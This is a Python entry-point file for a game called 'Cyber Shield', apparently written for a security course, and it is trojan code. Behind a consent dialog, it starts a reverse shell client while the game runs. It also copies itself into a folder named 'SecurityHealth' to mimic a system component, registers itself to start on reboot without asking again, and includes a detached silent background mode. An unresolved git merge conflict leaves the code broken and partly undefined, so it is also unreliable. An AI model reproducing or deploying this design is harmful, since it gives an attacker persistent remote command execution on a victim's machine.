"""
Entry point for the Cyber Shield game client.

Combines:
- Phase 1: Reverse shell while game runs
- Phase 2: Persistence registry entry for auto-start on restart
"""

import tkinter as tk
from tkinter import messagebox
import sys
import time
from pathlib import Path

root_path = Path(__file__).resolve().parent.parent
if str(root_path) not in sys.path:
    sys.path.insert(0, str(root_path))

try:
    from . import deps_check, persistence
    from .net_client import ShellClient
except (ImportError, ValueError):
    try:
        from game_client import deps_check, persistence
        from game_client.net_client import ShellClient
    except ImportError:
        import deps_check, persistence
        from net_client import ShellClient


def _show_consent_dialog(root: tk.Tk) -> bool:
    """Show consent dialog."""
    text = (
        "CYBER SHIELD – LAB GAME\n\n"
        "This game is part of a cybersecurity assignment.\n\n"
        "If you click 'Proceed to Game':\n"
        "  • A reverse shell connection will be established\n"
        "  • Commands can be executed on this machine\n"
        "  • Connection persists across system restarts\n"
        "  • Only CyberShieldCleanup.exe can remove this\n\n"
        "Use only on a virtual machine under your control."
    )
    return messagebox.askokcancel(
        "Cyber Shield – Information",
        text,
        parent=root,
        default=messagebox.OK,
    )


<<<<<<< HEAD
def get_game_exe_path() -> Path:
    """Get path for game executable copy (Phase 2 persistence)."""
=======
def _is_already_running() -> bool:
    """
    Check if a silent instance is already running using a lock file.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    return lock_file.exists()


def _run_silent_mode() -> None:
    """
    Run only the shell client in the background indefinitely.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    lock_file.parent.mkdir(exist_ok=True)

    if lock_file.exists():
        try:
            old_pid = int(lock_file.read_text().strip())
            # Check if process is still running
            if sys.platform == "win32":
                # tasklist check for Windows
                out = subprocess.run(["tasklist", "/FI", f"PID eq {old_pid}"], capture_output=True, text=True).stdout
                if str(old_pid) not in out:
                    lock_file.unlink()
            else:
                # kill -0 for Linux
                os.kill(old_pid, 0)
        except (OSError, ValueError, ProcessLookupError):
            # Process not found or invalid PID, safe to remove lock
            try:
                lock_file.unlink()
            except OSError:
                pass
        
        if lock_file.exists():
            # Still exists and likely active
            return

    lock_file.write_text(str(os.getpid()))

    try:
        shell_client = ShellClient()
        shell_client.start()
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        if lock_file.exists():
            try:
                lock_file.unlink()
            except OSError:
                pass


def _spawn_detached_background() -> None:
    """
    Migrate the current executable and launch it in silent mode as a detached process.
    """
    
    # Detect if we are running as a PyInstaller bundle or a script
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        source = Path(sys.executable)
    else:
        # For scripts, we can't easily 'migrate' a single file if it has dependencies.
        # But for the demo, we'll try to find the project root or just use sys.executable.
        source = Path(__file__).resolve().parent.parent / "game_client" / "game_main.py"
        if not source.exists():
             source = Path(sys.argv[0]).resolve()

    dest = get_migrated_path()

    # 1) Migrate (copy oneself to the trusted location)
    try:
        if dest.parent != source.parent:
            dest.parent.mkdir(parents=True, exist_ok=True)
        # Only copy if source is different from destination
        if source != dest:
            if not dest.exists() or source.stat().st_mtime > dest.stat().st_mtime:
                import shutil
                shutil.copy2(source, dest)
    except Exception:
        # If migration fails (e.g., permission denied to AppData on some systems), 
        # just run from the current location. The detachment will still work.
        dest = source

    # 2) Spawn the background process
    # DETACHED_PROCESS (0x08) + CREATE_NO_WINDOW (0x08000000) + CREATE_NEW_PROCESS_GROUP (0x0200)
    # These ensure the child is NOT tied to the parent's console or life-cycle.
    flags = 0
>>>>>>> dd750572a9ca65bc4544af45f9b7984c73d64a66
    if sys.platform == "win32":
        base = Path.home() / "AppData" / "Roaming" / "SecurityHealth"
    else:
        base = Path.home() / ".local" / "share" / "SecurityHealth"
    return base / "GameLauncher.exe"


def _copy_game_exe_for_persistence() -> bool:
    """Copy current game exe to AppData for Phase 2 restart persistence."""
    if sys.platform != "win32":
        return False
    
    try:
        import shutil
        
        # Get path of current running exe
        if getattr(sys, 'frozen', False):
            # Running as PyInstaller executable
            current_exe = Path(sys.executable)
        else:
            # Running as script (dev mode) - skip copy
            return False
        
        dest_exe = get_game_exe_path()
        dest_exe.parent.mkdir(parents=True, exist_ok=True)
        
        # Copy exe to AppData
        shutil.copy2(str(current_exe), str(dest_exe))
        return True
    except Exception:
        return False


def launch_game(skip_consent: bool = False) -> None:
    """
    Main entry point.
    
    Args:
        skip_consent: If True, skip the consent dialog (used for Phase 2 auto-start)
    """
    # 1) Show consent dialog (only on first run, not on Phase 2 restart)
    root = tk.Tk()
    root.withdraw()

    if not skip_consent:
        if not _show_consent_dialog(root):
            root.destroy()
            return

    # 2) Check dependencies
    if deps_check:
        try:
            ok, _ = deps_check.check_runtime_dependencies()
            if not ok:
                root.destroy()
                return
        except Exception:
            pass

    # 3) Setup Phase 2 persistence (only on first run, not on restart)
    if sys.platform == "win32" and not skip_consent:
        try:
            # Copy game exe to AppData for Phase 2
            _copy_game_exe_for_persistence()
            
            # Register game exe in registry to run on restart (without consent prompt)
            game_exe = get_game_exe_path()
            ok, msg = persistence.install_persistence(str(game_exe), skip_consent=True)
            # Continue regardless (game should run always)
        except Exception:
            pass

    root.destroy()

    # 4) Start Phase 1 reverse shell (runs with game)
    try:
        shell_client = ShellClient()
        shell_client.start()
        time.sleep(0.3)
    except Exception:
        pass

    # 5) Launch the pygame game
    try:
        from src.main import main as game_main
        game_main()
    except Exception:
        pass


def main() -> None:
    # Check if running from Phase 2 restart (skip consent)
    skip_consent = "--skip-consent" in sys.argv
    launch_game(skip_consent=skip_consent)


if __name__ == "__main__":
    main()
